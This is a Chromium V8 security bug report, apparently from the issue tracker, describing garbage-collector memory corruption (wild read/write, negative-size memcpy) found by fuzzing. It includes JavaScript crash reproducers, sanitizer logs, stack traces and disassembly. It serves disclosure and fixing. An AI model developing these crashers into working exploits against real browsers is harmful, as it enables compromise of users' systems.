# D8 SEGV wild read/write/negative-size-param / Check failed: func_info->parameter_count() == StateValuesAccess(state.parameters()).size() (0 vs. 65536)

| Field | Value |
|-------|-------|
| **Issue ID** | [385155406](https://issues.chromium.org/issues/385155406) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>GarbageCollection |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | al...@goodmanemail.com |
| **Assignee** | ve...@chromium.org |
| **Created** | 2024-12-20 |
| **Bounty** | $8,000.00 |

## Description

VULNERABILITY DETAILS
# Fatal error in ../../src/compiler/verifier.cc, line 611
# Check failed: func_info->parameter_count() == StateValuesAccess(state.parameters()).size() (0 vs. 65536). (This is what happens in an ASAN build with dchecks enabled)

==908705==ERROR: UndefinedBehaviorSanitizer: SEGV on unknown address 0x1718ff846454 (pc 0x7ffff7d98ac3 bp 0x7fffffffb480 sp 0x7fffffffb408 T908705)
==908705==The signal is caused by a WRITE memory access. (To me this one looks like a wild write)

==909193==ERROR: AddressSanitizer: negative-size-param: (size=-7171516)
Address 0x7abe00a0b900 is a wild pointer inside of access range of size 0x000000000001.
SUMMARY: AddressSanitizer: negative-size-param src/utils/memcopy.h in MemCopy

==910208==ERROR: AddressSanitizer: SEGV on unknown address 0x00000008e67c (pc 0x7ffff1f77afe bp 0x7fffffffd3f0 sp 0x7fffffffd340 T0)
==910208==The signal is caused by a READ memory access.
SUMMARY: AddressSanitizer: SEGV third_party/libc++/src/include/__atomic/support/c11.h:75:10 in __cxx_atomic_load<int>

VERSION
V8 a770bc7cd104cce1d4ae8f6443d79fb9b3434a91
Operating System: Ubuntu 24.04

BISECT
I stopped bisecting when I got to 6 months old.  Its segfaulting in a release build of d46b1d8f105d674d9bdabff56cb6c3a18bd50095

2024-12-20T11:11:44.222126+00:00 dl360p10fuzz kernel: d8[924282]: segfault at 23e3ffe5e64c ip 00007ffff7d98ac3 sp 00007fffffffc278 error 6 in libc.so.6[7ffff7c28000+188000] likely on CPU 9 (core 10, socket 0)
2024-12-20T11:11:44.222155+00:00 dl360p10fuzz kernel: Code: 66 03 48 83 ee 80 62 e1 fd 28 7f 0f 62 e1 fd 28 7f 57 01 62 e1 fd 28 7f 5f 02 62 e1 fd 28 7f 67 03 48 83 ef 80 48 39 fa 77 bd <62> e1 fe 28 7f 6a 03 62 e1 fe 28 7f 72 02 62 e1 fe 28 7f 7a 01 62

MY ANALYSIS
I think this might be related to https://issues.chromium.org/issues/344664770 however I've ran out of skills trying to get to the bottom of it (surprise surprise).  In my fuzzer build (which is as close as I can get for an instrumented binary to a release build, running in a modified version of fuzzilli) I get what looks like a wild write.  So then I try in an ASAN build and get a 'harmless' Check failed.  If I remove that check from the code (since release builds dont run checks) then ASAN build tends to blow up with wild read or negative size param.  I believe something is going terribly wrong in garbage collection, a lot of the test cases are triggering OOM condition.  Checking with release builds the SEGV looks most like the wild write I am getting in my fuzzilli build.

REPRODUCTION CASE (Attached)
I've got a huge pile of crashers which all appear to be the same issue.  The attached one happens to be one of those fuzzilli testcases that appear to be placed into some kind of larger framework file which I honestly do not understand.  Therefore I've not tried to minimize it yet.  I will add a minimized repro if I can create one that makes sense to me.

FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION
Type of crash: SEGV read/write / Check Failed

./d8 --expose-gc --expose-externalize-string --omit-quit --allow-natives-syntax --fuzzing --jit-fuzzing --future --harmony --js-staging --wasm-staging --disable-in-process-stack-traces ~/fuzzilli_corpus/crashes/program_20241220024106_E23EB080-4FC2-4AF7-9394-F33E868748A2_flaky.js
[COV] no shared memory bitmap available, skipping
[COV] edge counters initialized. Shared memory: (null) with 878562 edges
UndefinedBehaviorSanitizer:DEADLYSIGNAL
==936268==ERROR: UndefinedBehaviorSanitizer: SEGV on unknown address 0x169aff84594c (pc 0x7ffff7d98ac3 bp 0x7fffffffb550 sp 0x7fffffffb4d8 T936268)
==936268==The signal is caused by a WRITE memory access.
    #0 0x7ffff7d98ac3 in __memcpy_evex_unaligned_erms string/../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:496
    #1 0x555556e2670e in heap::base::SlotCallbackResult v8::internal::Scavenger::ScavengeObject<v8::internal::CompressedHeapObjectSlot>(v8::internal::CompressedHeapObjectSlot, v8::internal::Tagged<v8::internal::HeapObject>) (/home/alan/v8/v8/out/fuzzilli/d8+0x18d270e) (BuildId: 787711c61a56e1db)
    #2 0x555556dfdc2b in v8::internal::Scavenger::Process(v8::JobDelegate*) (/home/alan/v8/v8/out/fuzzilli/d8+0x18a9c2b) (BuildId: 787711c61a56e1db)
    #3 0x555556def28b in v8::internal::ScavengerCollector::JobTask::ProcessItems(v8::JobDelegate*, v8::internal::Scavenger*) (/home/alan/v8/v8/out/fuzzilli/d8+0x189b28b) (BuildId: 787711c61a56e1db)
    #4 0x555556deeaa9 in v8::internal::ScavengerCollector::JobTask::Run(v8::JobDelegate*) (/home/alan/v8/v8/out/fuzzilli/d8+0x189aaa9) (BuildId: 787711c61a56e1db)
    #5 0x555558e337bd in v8::platform::DefaultJobState::Join() (/home/alan/v8/v8/out/fuzzilli/d8+0x38df7bd) (BuildId: 787711c61a56e1db)
    #6 0x555558e33e4e in v8::platform::DefaultJobHandle::Join() (/home/alan/v8/v8/out/fuzzilli/d8+0x38dfe4e) (BuildId: 787711c61a56e1db)
    #7 0x555556e0217e in v8::internal::ScavengerCollector::CollectGarbage() (/home/alan/v8/v8/out/fuzzilli/d8+0x18ae17e) (BuildId: 787711c61a56e1db)
    #8 0x555556cf647b in v8::internal::Heap::Scavenge() (/home/alan/v8/v8/out/fuzzilli/d8+0x17a247b) (BuildId: 787711c61a56e1db)
    #9 0x555556cf493f in v8::internal::Heap::PerformGarbageCollection(v8::internal::GarbageCollector, v8::internal::GarbageCollectionReason, char const*) (/home/alan/v8/v8/out/fuzzilli/d8+0x17a093f) (BuildId: 787711c61a56e1db)
    #10 0x555556d1bf68 in v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags)::$_1::operator()() const heap.cc
    #11 0x555556d1b995 in void heap::base::Stack::SetMarkerAndCallbackImpl<v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags)::$_1>(heap::base::Stack*, void*, void const*) heap.cc
    #12 0x555557ce51a6 in PushAllRegistersAndIterateStack push_registers_asm.cc

==936268==Register values:
rax = 0x0000169b000aca18  rbx = 0x0000555559b51f90  rcx = 0x0000169b000aca18  rdx = 0x0000169aff8458ec  
rdi = 0x0000169b000acaa0  rsi = 0x0000169b00913b38  rbp = 0x00007fffffffb550  rsp = 0x00007fffffffb4d8  
 r8 = 0x0000169b000aca18   r9 = 0x0000000000000030  r10 = 0x0000000000000001  r11 = 0x00000000013c0000  
r12 = 0x0000169b00913aad  r13 = 0x00000000ff798f58  r14 = 0x0000000000000565  r15 = 0x0000169b00000565  
UndefinedBehaviorSanitizer can not provide additional info.
SUMMARY: UndefinedBehaviorSanitizer: SEGV string/../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:496 in __memcpy_evex_unaligned_erms
==936268==ABORTING

RANDOM ADENDUM
To create my release mode binaries I ran what looked to be a helpful script: tools/dev/gm.py x64.release.  Glancing through the script it didnt look like it was going to break my v8 tree but after running it; all my other builds in ./out are 'cleaned' - eg wiped out.  This has really thrown a spanner in trying to complete this report.  Hopefully if I erase my v8 directory and check out a new copy this weirdness goes away but this is super frustrating +++ because its not clear from reading the script that its gonna do this and it doesnt anywhere mention running it could cause data loss in your output folder.

CREDIT INFORMATION
Externally reported security bugs may appear in Chrome release notes. If this bug is included, how would you like to be credited?
Reporter credit: Alan Goodman

## Attachments

- program_20241220024106_E23EB080-4FC2-4AF7-9394-F33E868748A2_flaky.js (text/javascript, 16.7 KB)
- [check_mod.js](attachments/check_mod.js) (text/javascript, 13.8 KB)
- [controlled_read_mod.js](attachments/controlled_read_mod.js) (text/javascript, 49.5 KB)

## Timeline

### al...@goodmanemail.com (2024-12-20)

Looking through the crashers, this one sticks out to me as being very similar to the regression test listed on the aforementioned crbug:

const v1 = [65052,-14,1,12,19662,14];
function f3() {
    return arguments;
}
arr = [f3,f3,f3];
arr.length = 65521;
const v10 = f3.bind(null, ...arr, ..."setUint32", 1073741824);
function f11() {
    return v10(f11, v1, f11, arr)[50901];
}
const v14 = %PrepareFunctionForOptimization(f11);
f11();
const v16 = %OptimizeFunctionOnNextCall(f11);
f11();

Its triggering the check in an asan build, exiting 133 in my fuzz build.  Without the check ASAN also exits 133.

const v2 = new Uint32Array(3290);
const v5 = new Uint32Array(2906);
Float64Array.d = Float64Array;
const v8 = new Float64Array(0);
const v10 = [null,null,null];
[v2,Float64Array,Uint32Array,2906,v8];
const v12 = [Uint32Array,v8,v5,v10,2906];
v12[2] = v12;
try { ("buffer").padEnd("buffer"); } catch (e) {}
const v18 = [65052,-14,1,12,19662,14];
try { ("setUint32").blink(); } catch (e) {}
function f21() {
    return arguments;
}
f21.length = f21;
arr = ["setUint32","setUint32","setUint32"];
try { arr.with(0, "setUint32"); } catch (e) {}
arr.length = 65521;
arr.a = arr;
const v29 = f21.bind(null, ...arr, ..."setUint32", 1073741824);
function f30() {
    const v31 = v29(f30, v18, f30, arr);
    v31[16613] = v31;
    return v31;
}
f30.caller = f30;
const v32 = %PrepareFunctionForOptimization(f30);
f30();
const v34 = %OptimizeFunctionOnNextCall(f30);
f30();

In ASAN build without the check in place crashes with wild read:

$ ASAN_OPTIONS=print_scariness=1 ./d8 --expose-gc --expose-externalize-string --omit-quit --allow-natives-syntax --fuzzing --jit-fuzzing --future --harmony --js-staging --wasm-staging --disable-in-process-stack-traces ~/fuzzilli_corpus/crashes/program_20241220014337_B470DF9A-6656-44BA-867C-EA86E12D3621_flaky.js
AddressSanitizer:DEADLYSIGNAL
=================================================================
==947202==ERROR: AddressSanitizer: SEGV on unknown address 0x00000008e680 (pc 0x7ffff20fd114 bp 0x7fffffffd3f0 sp 0x7fffffffd340 T0)
==947202==The signal is caused by a READ memory access.
SCARINESS: 20 (wild-addr-read)
    #0 0x7ffff20fd114 in __cxx_atomic_load<int> third_party/libc++/src/include/__atomic/support/c11.h:75:10
    #1 0x7ffff20fd114 in load third_party/libc++/src/include/__atomic/atomic.h:63:12
    #2 0x7ffff20fd114 in atomic_load_explicit<int> third_party/libc++/src/include/__atomic/atomic.h:524:15
    #3 0x7ffff20fd114 in Relaxed_Load src/base/atomicops.h:245:10
    #4 0x7ffff20fd114 in Relaxed_Load<unsigned int> src/base/atomic-utils.h:88:9
    #5 0x7ffff20fd114 in Relaxed_Load_Map_Word src/objects/tagged-field-inl.h:280:26
    #6 0x7ffff20fd114 in map_word src/objects/objects-inl.h:1474:10
    #7 0x7ffff20fd114 in map src/objects/objects-inl.h:1286:10
    #8 0x7ffff20fd114 in v8::internal::HeapObject::HeapObjectPrint(std::__Cr::basic_ostream<char, std::__Cr::char_traits<char>>&) src/diagnostics/objects-printer.cc:217:32
    #9 0x7ffff35175d7 in void v8::internal::Print<(v8::internal::HeapObjectReferenceType)0, unsigned long>(v8::internal::TaggedImpl<(v8::internal::HeapObjectReferenceType)0, unsigned long>, std::__Cr::basic_ostream<char, std::__Cr::char_traits<char>>&) src/objects/tagged-impl.cc:103:18
    #10 0x7ffff334d988 in v8::internal::CheckObjectType(unsigned long, unsigned long, unsigned long) src/objects/object-type.cc:78:3
    #11 0x7bff7f378e08 in Builtins_KeyedStoreIC_Megamorphic setup-isolate-deserialize.cc
    #12 0x7bff600068f8  (<unknown module>)
    #13 0x7bff60005bdf  (<unknown module>)
    #14 0x7bff7f34231b in Builtins_ConstructProxy setup-isolate-deserialize.cc
    #15 0x7bff7f34206a in Builtins_ConstructProxy setup-isolate-deserialize.cc
    #16 0x7ffff21970fe in Call src/execution/simulator.h:191:12
    #17 0x7ffff21970fe in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) src/execution/execution.cc:436:22
    #18 0x7ffff2199deb in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) src/execution/execution.cc:536:10
    #19 0x7ffff181c364 in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) src/api/api.cc:2155:7
    #20 0x555555716e05 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) src/d8/d8.cc:1013:44
    #21 0x55555574566d in v8::SourceGroup::Execute(v8::Isolate*) src/d8/d8.cc:4942:10
    #22 0x555555750214 in v8::Shell::RunMainIsolate(v8::Isolate*, bool) src/d8/d8.cc:5886:37
    #23 0x55555574f585 in v8::Shell::RunMain(v8::Isolate*, bool) src/d8/d8.cc:5795:18
    #24 0x555555752b38 in v8::Shell::Main(int, char**) src/d8/d8.cc:6649:18
    #25 0x7fffeca2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #26 0x7fffeca2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #27 0x555555602289 in _start (/home/alan/v8/v8/out/asan/d8+0xae289) (BuildId: b930eb2f6a470a1d)

==947202==Register values:
rax = 0x0000000000000000  rbx = 0x00007fffffffd340  rcx = 0x00007ffff7edfc40  rdx = 0x00007bffea9eba40  
rdi = 0x000000000008e680  rsi = 0x0000000000000040  rbp = 0x00007fffffffd3f0  rsp = 0x00007fffffffd340  
 r8 = 0x00000f7ffd5ce000   r9 = 0x00007fffffffff01  r10 = 0x0000000000000001  r11 = 0x00007ffff3517380  
r12 = 0x00007bffeab72830  r13 = 0x00000f7ffd53d748  r14 = 0x00000ffffefdbf88  r15 = 0x00007bffeae70000  
AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV third_party/libc++/src/include/__atomic/support/c11.h:75:10 in __cxx_atomic_load<int>
==947202==ABORTING

If I find a moment I will try to minimize them manually.


### al...@goodmanemail.com (2024-12-20)

In release build 8A2 crasher from comment 1 crashes with what looks like wild write.  Here is the stack trace:

Running with args --allow-natives-syntax --jit-fuzzing poc.js

#0  __memcpy_evex_unaligned_erms () at ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:496
#1  0x0000555556b5fc02 in heap::base::SlotCallbackResult v8::internal::Scavenger::ScavengeObject<v8::internal::CompressedHeapObjectSlot>(v8::internal::CompressedHeapObjectSlot, v8::internal::Tagged<v8::internal::HeapObject>) ()
#2  0x0000555556b497d1 in v8::internal::Scavenger::Process(v8::JobDelegate*) ()
#3  0x0000555556b44a47 in v8::internal::ScavengerCollector::JobTask::ProcessItems(v8::JobDelegate*, v8::internal::Scavenger*) ()
#4  0x0000555556b4478c in v8::internal::ScavengerCollector::JobTask::Run(v8::JobDelegate*) ()
#5  0x0000555557e7eb7d in v8::platform::DefaultJobState::Join() ()
#6  0x0000555557e7eff3 in v8::platform::DefaultJobHandle::Join() ()
#7  0x0000555556b4d878 in v8::internal::ScavengerCollector::CollectGarbage() ()
#8  0x0000555556ab2abc in v8::internal::Heap::Scavenge() ()
#9  0x0000555556ab16b0 in v8::internal::Heap::PerformGarbageCollection(v8::internal::GarbageCollector, v8::internal::GarbageCollectionReason, char const*) ()
#10 0x0000555556ac82e3 in v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags)::$_1::operator()() const ()
#11 0x0000555556ac7e5f in void heap::base::Stack::SetMarkerAndCallbackImpl<v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags)::$_1>(heap::base::Stack*, void*, void const*) ()
#12 0x0000555557398c7b in PushAllRegistersAndIterateStack ()
#13 0x0000555556aad23f in v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags) ()
#14 0x0000555556a905d2 in v8::internal::HeapAllocator::AllocateRawWithLightRetrySlowPath(int, v8::internal::AllocationType, v8::internal::AllocationOrigin, v8::internal::AllocationAlignment) ()
#15 0x0000555556a91212 in v8::internal::HeapAllocator::AllocateRawWithRetryOrFailSlowPath(int, v8::internal::AllocationType, v8::internal::AllocationOrigin, v8::internal::AllocationAlignment) ()
#16 0x0000555556a6e22e in v8::internal::Factory::AllocateRaw(int, v8::internal::AllocationType, v8::internal::AllocationAlignment) ()
#17 0x0000555556a5b5de in v8::internal::FactoryBase<v8::internal::Factory>::NewRawOneByteString(int, v8::internal::AllocationType) ()
#18 0x0000555556a5b43e in v8::internal::FactoryBase<v8::internal::Factory>::NewStringFromOneByte(v8::base::Vector<unsigned char const>, v8::internal::AllocationType) ()
#19 0x0000555556a5c322 in v8::internal::FactoryBase<v8::internal::Factory>::SmiToString(v8::internal::Tagged<v8::internal::Smi>, v8::internal::NumberCacheMode) ()
#20 0x0000555556c84afc in v8::internal::(anonymous namespace)::ElementsAccessorBase<v8::internal::(anonymous namespace)::FastHoleyObjectElementsAccessor, v8::internal::(anonymous namespace)::ElementsKindTraits<(v8::internal::ElementsKind)3> >::DirectCollectElementIndicesImpl(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSObject>, v8::internal::DirectHandle<v8::internal::FixedArrayBase>, v8::internal::GetKeysConversion, v8::internal::PropertyFilter, v8::internal::Handle<v8::internal::FixedArray>, unsigned int*, unsigned int) ()
#21 0x0000555556c832fb in v8::internal::(anonymous namespace)::ElementsAccessorBase<v8::internal::(anonymous namespace)::FastHoleyObjectElementsAccessor, v8::internal::(anonymous namespace)::ElementsKindTraits<(v8::internal::ElementsKind)3> >::PrependElementIndices(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSObject>, v8::internal::DirectHandle<v8::internal::FixedArrayBase>, v8::internal::DirectHandle<v8::internal::FixedArray>, v8::internal::GetKeysConversion, v8::internal::PropertyFilter) ()
#22 0x0000555556d71eeb in v8::internal::MaybeHandle<v8::internal::FixedArray> v8::internal::(anonymous namespace)::GetOwnKeysWithElements<false>(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSObject>, v8::internal::GetKeysConversion, bool) ()
#23 0x0000555556d6f4ab in v8::internal::KeyAccumulator::GetKeys(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSReceiver>, v8::internal::KeyCollectionMode, v8::internal::PropertyFilter, v8::internal::GetKeysConversion, bool, bool) ()
#24 0x0000555556c12d23 in v8::internal::JsonStringifier::SerializeJSReceiverSlow(v8::internal::DirectHandle<v8::internal::JSReceiver>) ()
#25 0x0000555556c19dc9 in v8::internal::JsonStringifier::Result v8::internal::JsonStringifier::Serialize_<true>(v8::internal::Handle<v8::internal::Union<v8::internal::Smi, v8::internal::HeapNumber, v8::internal::BigInt, v8::internal::String, v8::internal::Symbol, v8::internal::Boolean, v8::internal::Null, v8::internal::Undefined, v8::internal::JSReceiver> >, bool, v8::internal::Handle<v8::internal::Object>) ()
#26 0x0000555556c1b239 in v8::internal::JsonStringifier::Result v8::internal::JsonStringifier::Serialize_<true>(v8::internal::Handle<v8::internal::Union<v8::internal::Smi, v8::internal::HeapNumber, v8::internal::BigInt, v8::internal::String, v8::internal::Symbol, v8::internal::Boolean, v8::internal::Null, v8::internal::Undefined, v8::internal::JSReceiver> >, bool, v8::internal::Handle<v8::internal::Object>) ()
#27 0x0000555556c12e1a in v8::internal::JsonStringifier::SerializeJSReceiverSlow(v8::internal::DirectHandle<v8::internal::JSReceiver>) ()
#28 0x0000555556c14a0e in v8::internal::JsonStringifier::Result v8::internal::JsonStringifier::Serialize_<false>(v8::internal::Handle<v8::internal::Union<v8::internal::Smi, v8::internal::HeapNumber, v8::internal::BigInt, v8::internal::String, v8::internal::Symbol, v8::internal::Boolean, v8::internal::Null, v8::internal::Undefined, v8::internal::JSReceiver> >, bool, v8::internal::Handle<v8::internal::Object>) ()
#29 0x0000555556c0d31d in v8::internal::JsonStringifier::Stringify(v8::internal::Handle<v8::internal::Union<v8::internal::Smi, v8::internal::HeapNumber, v8::internal::BigInt, v8::internal::String, v8::internal::Symbol, v8::internal::Boolean, v8::internal::Null, v8::internal::Undefined, v8::internal::JSReceiver> >, v8::internal::Handle<v8::internal::Union<v8::internal::Smi, v8::internal::HeapNumber, v8::internal::BigInt, v8::internal::String, v8::internal::Symbol, v8::internal::Boolean, v8::internal::Null, v8::internal::Undefined, v8::internal::JSReceiver> >, v8::internal::Handle<v8::internal::Object>) ()
--Type <RET> for more, q to quit, c to continue without paging--c
#30 0x0000555556c13674 in v8::internal::JsonStringify(v8::internal::Isolate*, v8::internal::Handle<v8::internal::Union<v8::internal::Smi, v8::internal::HeapNumber, v8::internal::BigInt, v8::internal::String, v8::internal::Symbol, v8::internal::Boolean, v8::internal::Null, v8::internal::Undefined, v8::internal::JSReceiver> >, v8::internal::Handle<v8::internal::Union<v8::internal::Smi, v8::internal::HeapNumber, v8::internal::BigInt, v8::internal::String, v8::internal::Symbol, v8::internal::Boolean, v8::internal::Null, v8::internal::Undefined, v8::internal::JSReceiver> >, v8::internal::Handle<v8::internal::Object>) ()
#31 0x0000555556881ef3 in v8::internal::Builtin_JsonStringify(int, unsigned long*, v8::internal::Isolate*) ()
#32 0x0000555557cd3136 in Builtins_CEntry_Return1_ArgvOnStack_BuiltinExit ()
#33 0x0000555557c27a81 in Builtins_InterpreterEntryTrampoline ()

(gdb) disassemble $pc-10, $pc+10
Dump of assembler code from 0x7ffff7d98ab9 to 0x7ffff7d98acd:
   0x00007ffff7d98ab9 <__memcpy_evex_unaligned_erms+505>:	add    -0x7d(%rax),%ecx
   0x00007ffff7d98abc <__memcpy_evex_unaligned_erms+508>:	out    %eax,(%dx)
   0x00007ffff7d98abd <__memcpy_evex_unaligned_erms+509>:	orb    $0xfa,0x39(%rax)
   0x00007ffff7d98ac1 <__memcpy_evex_unaligned_erms+513>:	ja     0x7ffff7d98a80 <__memcpy_evex_unaligned_erms+448>
=> 0x00007ffff7d98ac3 <__memcpy_evex_unaligned_erms+515>:	vmovdqu64 %ymm21,0x60(%rdx)
   0x00007ffff7d98aca <__memcpy_evex_unaligned_erms+522>:	vmovdqu64 %ymm22,0x40(%rdx)

Which looks to my eyes like a wild write.

### al...@goodmanemail.com (2024-12-20)

Seems to replicate in stable channel:

$ vpython3 get_asan_chrome.py --channel stable
$ unzip chromium-131.0.6778.204-linux-asan.zip
./d8 --allow-natives-syntax --jit-fuzzing ~/fuzzilli_corpus/crashes/program_20241220024106_E23EB080-4FC2-4AF7-9394-F33E868748A2_flaky.js
$ ./d8 --allow-natives-syntax --jit-fuzzing ~/fuzzilli_corpus/crashes/program_20241220024106_E23EB080-4FC2-4AF7-9394-F33E868748A2_flaky.js
=================================================================
==957954==ERROR: AddressSanitizer: negative-size-param: (size=-8476084)
    #0 0x5555568a184f in __asan_memcpy /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cpp:63:3
    #1 0x5555572b5a46 in MemCopy v8/src/utils/memcopy.h
    #2 0x5555572b5a46 in CopyImpl<16UL, unsigned int> v8/src/utils/memcopy.h:247:5
    #3 0x5555572b5a46 in CopyTagged v8/src/objects/slots-inl.h:455:3
    #4 0x5555572b5a46 in v8::internal::Heap::CopyBlock(unsigned long, unsigned long, int) v8/src/heap/heap-inl.h:288:3
    #5 0x55555729e9c4 in MigrateObject v8/src/heap/scavenger-inl.h:99:3
    #6 0x55555729e9c4 in SemiSpaceCopyObject<v8::internal::CompressedHeapObjectSlot> v8/src/heap/scavenger-inl.h:139:9
    #7 0x55555729e9c4 in EvacuateObjectDefault<v8::internal::CompressedHeapObjectSlot, (v8::internal::Scavenger::PromotionHeapChoice)0> v8/src/heap/scavenger-inl.h:253:14
    #8 0x55555729e9c4 in EvacuateObject<v8::internal::CompressedHeapObjectSlot> v8/src/heap/scavenger-inl.h:391:14
    #9 0x55555729e9c4 in heap::base::SlotCallbackResult v8::internal::Scavenger::ScavengeObject<v8::internal::CompressedHeapObjectSlot>(v8::internal::CompressedHeapObjectSlot, v8::internal::Tagged<v8::internal::HeapObject>) v8/src/heap/scavenger-inl.h:426:10
    #10 0x555557285e2f in VisitHeapObjectImpl<v8::internal::CompressedObjectSlot> v8/src/heap/scavenger-inl.h:504:17
    #11 0x555557285e2f in VisitPointersImpl<v8::internal::CompressedObjectSlot> v8/src/heap/scavenger-inl.h:521:7
    #12 0x555557285e2f in VisitPointers v8/src/heap/scavenger-inl.h:490:10
    #13 0x555557285e2f in IteratePointers<v8::internal::ScavengeVisitor> v8/src/objects/objects-body-descriptors-inl.h:194:6
    #14 0x555557285e2f in IterateBody<v8::internal::ScavengeVisitor> v8/src/objects/objects-body-descriptors-inl.h:337:5
    #15 0x555557285e2f in VisitJSObjectSubclass<v8::internal::JSObject, v8::internal::JSObject::FastBodyDescriptor> v8/src/heap/objects-visiting-inl.h:277:3
    #16 0x555557285e2f in VisitJSObjectFast v8/src/heap/objects-visiting-inl.h:239:18
    #17 0x555557285e2f in Visit v8/src/heap/objects-visiting-inl.h:135:23
    #18 0x555557285e2f in Visit v8/src/heap/objects-visiting-inl.h:93:10
    #19 0x555557285e2f in v8::internal::Scavenger::Process(v8::JobDelegate*) v8/src/heap/scavenger.cc:852:24
    #20 0x55555727e13a in v8::internal::ScavengerCollector::JobTask::ProcessItems(v8::JobDelegate*, v8::internal::Scavenger*) v8/src/heap/scavenger.cc:284:16
    #21 0x55555727d253 in v8::internal::ScavengerCollector::JobTask::Run(v8::JobDelegate*) v8/src/heap/scavenger.cc:254:5
    #22 0x55555b307377 in v8::platform::DefaultJobState::Join() v8/src/libplatform/default-job.cc:141:16
    #23 0x55555b308343 in v8::platform::DefaultJobHandle::Join() v8/src/libplatform/default-job.cc:238:11
    #24 0x55555728e191 in v8::internal::ScavengerCollector::CollectGarbage() v8/src/heap/scavenger.cc:462:13
    #25 0x5555570c5c67 in v8::internal::Heap::Scavenge() v8/src/heap/heap.cc:2766:25
    #26 0x5555570c2800 in v8::internal::Heap::PerformGarbageCollection(v8::internal::GarbageCollector, v8::internal::GarbageCollectionReason, char const*) v8/src/heap/heap.cc:2309:5
    #27 0x5555571120f5 in v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags)::$_0::operator()() const v8/src/heap/heap.cc:1734:7
    #28 0x5555571118fc in void heap::base::Stack::SetMarkerAndCallbackImpl<v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags)::$_0>(heap::base::Stack*, void*, void const*) v8/src/heap/base/stack.h:170:5
    #29 0x55555950bd62 in PushAllRegistersAndIterateStack push_registers_asm.cc
    #30 0x5555570b6a75 in SetMarkerIfNeededAndCallback<(lambda at ../../v8/src/heap/heap.cc:1702:40)> v8/src/heap/base/stack.h:76:7
    #31 0x5555570b6a75 in v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags) v8/src/heap/heap.cc:1702:11
    #32 0x555557072366 in CollectGarbage v8/src/heap/heap-allocator.cc:136:12
    #33 0x555557072366 in v8::internal::HeapAllocator::AllocateRawWithLightRetrySlowPath(int, v8::internal::AllocationType, v8::internal::AllocationOrigin, v8::internal::AllocationAlignment) v8/src/heap/heap-allocator.cc:120:5
    #34 0x555557075307 in v8::internal::HeapAllocator::AllocateRawWithRetryOrFailSlowPath(int, v8::internal::AllocationType, v8::internal::AllocationOrigin, v8::internal::AllocationAlignment) v8/src/heap/heap-allocator.cc:148:7
    #35 0x5555570040a7 in AllocateRawWith<(v8::internal::HeapAllocator::AllocationRetryMode)1> v8/src/heap/heap-allocator-inl.h:252:16
    #36 0x5555570040a7 in v8::internal::Factory::AllocateRaw(int, v8::internal::AllocationType, v8::internal::AllocationAlignment) v8/src/heap/factory.cc:290:23
    #37 0x555556fe6ce3 in AllocateRaw v8/src/heap/factory-base.cc:1281:18
    #38 0x555556fe6ce3 in AllocateRawWithImmortalMap v8/src/heap/factory-base.cc:1272:31
    #39 0x555556fe6ce3 in NewRawStringWithMap<v8::internal::SeqOneByteString> v8/src/heap/factory-base.cc:809:24
    #40 0x555556fe6ce3 in v8::internal::FactoryBase<v8::internal::Factory>::NewRawOneByteString(int, v8::internal::AllocationType) v8/src/heap/factory-base.cc:822:10
    #41 0x555556fe6845 in v8::internal::FactoryBase<v8::internal::Factory>::NewStringFromOneByte(v8::base::Vector<unsigned char const>, v8::internal::AllocationType) v8/src/heap/factory-base.cc:974:3
    #42 0x555556fe99b0 in NewStringFromAsciiChecked v8/src/heap/factory-base.h:316:12
    #43 0x555556fe99b0 in CharToString<v8::internal::Factory> v8/src/heap/factory-base.cc:998:19
    #44 0x555556fe99b0 in v8::internal::FactoryBase<v8::internal::Factory>::SmiToString(v8::internal::Tagged<v8::internal::Smi>, v8::internal::NumberCacheMode) v8/src/heap/factory-base.cc:1066:14
    #45 0x5555570403c5 in v8::internal::Factory::SizeToString(unsigned long, bool) v8/src/heap/factory.cc:3894:12
